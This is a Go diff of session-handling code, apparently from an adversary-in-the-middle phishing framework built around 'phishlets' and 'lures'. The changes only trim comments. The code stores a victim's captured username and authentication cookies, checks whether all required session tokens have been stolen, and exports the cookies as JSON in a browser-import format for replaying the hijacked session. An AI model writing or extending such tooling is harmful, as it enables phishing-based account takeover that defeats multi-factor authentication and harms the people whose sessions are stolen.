@@ -52,13 +52,11 @@ type Session struct {
 	CompletedAt  *time.Time // nil until all auth_tokens are captured
 }
 
-// LureRedirectURL returns the URL to redirect the victim to after session completion.
 func (s *Session) LureRedirectURL() string { return s.RedirectURL }
 
 // IsDone returns true when all required auth tokens have been captured.
 func (s *Session) IsDone() bool { return s.CompletedAt != nil }
 
-// HasCredentials returns true if at least a username has been captured.
 func (s *Session) HasCredentials() bool { return s.Username != "" }
 
 // HasRequiredTokens returns true when all non-always auth tokens defined by
@@ -100,13 +98,12 @@ func (s *Session) hasCookieToken(rule TokenRule) bool {
 	return false
 }
 
-// Complete marks the session as done with the current timestamp.
 func (s *Session) Complete() {
 	now := time.Now()
 	s.CompletedAt = &now
 }
 
-// AddCookieToken stores a captured cookie, initialising nested maps as needed.
+// AddCookieToken stores a captured cookie, lazily initialising nested maps.
 func (s *Session) AddCookieToken(domain, name string, tok *CookieToken) {
 	if s.CookieTokens == nil {
 		s.CookieTokens = make(map[string]map[string]*CookieToken)
@@ -117,8 +114,7 @@ func (s *Session) AddCookieToken(domain, name string, tok *CookieToken) {
 	s.CookieTokens[domain][name] = tok
 }
 
-// ExportCookies returns all captured cookies as a flat list in the format
-// expected by the StorageAce browser import extension.
+// ExportCookies returns captured cookies in StorageAce import format.
 func (s *Session) ExportCookies() []CookieExport {
 	var out []CookieExport
 	for _, byName := range s.CookieTokens {
@@ -138,7 +134,6 @@ func (s *Session) ExportCookies() []CookieExport {
 	return out
 }
 
-// CookieToken is a single captured cookie value.
 type CookieToken struct {
 	Name     string
 	Value    string
@@ -205,8 +200,7 @@ func (s *SessionService) Delete(id string) error {
 	return s.Store.DeleteSession(id)
 }
 
-// NewSession creates and persists a new session seeded from the proxy context.
-// Satisfies the request.SessionFactory interface.
+// NewSession satisfies the request.SessionFactory interface.
 func (s *SessionService) NewSession(ctx *ProxyContext) (*Session, error) {
 	sess := &Session{
 		ID:         uuid.New().String(),
@@ -228,15 +222,12 @@ func (s *SessionService) NewSession(ctx *ProxyContext) (*Session, error) {
 	return sess, nil
 }
 
-// IsComplete reports whether all required auth tokens have been captured.
-// Satisfies the response.SessionCompleter interface.
+// IsComplete satisfies the response.SessionCompleter interface.
 func (s *SessionService) IsComplete(sess *Session, def *PhishletDef) bool {
 	return sess.HasRequiredTokens(def)
 }
 
 
-// ExportCookiesJSON returns the captured cookies for a session as a JSON byte
-// slice ready to be sent to the API caller or written to a file.
 func (s *SessionService) ExportCookiesJSON(id string) ([]byte, error) {
 	session, err := s.Store.GetSession(id)
 	if err != nil {
